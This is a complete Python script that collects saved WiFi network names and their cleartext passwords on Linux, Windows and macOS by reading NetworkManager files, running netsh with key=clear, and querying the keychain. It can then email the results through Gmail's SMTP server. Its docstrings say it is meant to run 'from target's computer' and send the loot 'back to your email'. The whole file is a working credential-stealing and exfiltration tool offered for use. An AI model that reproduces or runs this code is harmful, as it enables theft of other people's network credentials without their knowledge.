#!/usr/bin/env python3
"""
Search for host's WIFI network and password history and display output or
send results to the specified gmail

2 flaws present in this app
[1] requires python to be installed in host's computer
[2] requires administration authorisation (sudo password etc.)

no installation of modules required
"""
import subprocess
import smtplib
import re
import platform


def send_email(my_email, password, message):
    """send discovered wifi profiles and passwords back to your email"""
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(my_email, password)
    # send from my_email to my_email (from, to, message)
    server.sendmail(my_email, my_email, message)
    server.quit()


def linux():
    """Enable linux support, tested on Ubuntu 18.04 and Kali"""
    command = "cat /etc/NetworkManager/system-connections/*"
    networks = subprocess.check_output(command, shell=True).decode("utf-8")
    return networks


def windows10():
    """Enable windows 10 support"""
    command = "netsh wlan show profile"
    # requires .decode("utf-8") if using python3
    networks = subprocess.check_output(command, shell=True).decode("utf-8")

    # find all network profiles and display it as a list
    network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)

    result = ""
    for profile_name in network_names:
        command = "netsh wlan show profile " + profile_name + " key=clear"
        # requires .decode("utf-8") if using python3
        current_result = subprocess.check_output(command,
                                                 shell=True).decode("utf-8")
        result += current_result
    return result


# TODO remove keychain prompt
def osx():
    """
    Enable MAC OS X support
    Requires manual input of keychain username and password to work

    Although profile and passwords can be displayed,
    editing the return string may cause display output to be None in email
    """
    command = "defaults read /Library/Preferences/SystemConfiguration/"\
        "com.apple.airport.preferences KnownNetworks | grep SSIDString"
    networks = subprocess.check_output(command,
                                       shell=True).decode("utf-8").split()
    profiles = ""
    passwords = ""
    for i in range(2, len(networks), 3):
        profile_name = networks[i][1:-2]
        profiles += profile_name + "\t\t|\t"
        command = "security find-generic-password -wa " + profile_name
        current_result = subprocess.check_output(
            command, shell=True).decode("utf-8").strip()
        passwords += current_result + "\t\t|\t"
    return "{}\n{}".format(profiles, passwords)


def main(my_email=None, password=None):
    """
    Check OS and run app according to the discovered OS
    direct input of gmail and password required if need automation,
    from target's computer

    If gmail or password is None, prints all wifi profiles and password
    history in your computer for reference if needed
    """
    os = platform.system()
    os_dict = {
        "Linux": linux,
        "Darwin": osx,
        "Windows": windows10
    }
    try:
        result = os_dict[os]()
    except TypeError:
        result = "OS not supported"
    if my_email is None and password is None:
        print(result)
        return
    send_email(my_email, password, result)


if __name__ == "__main__":
    main()
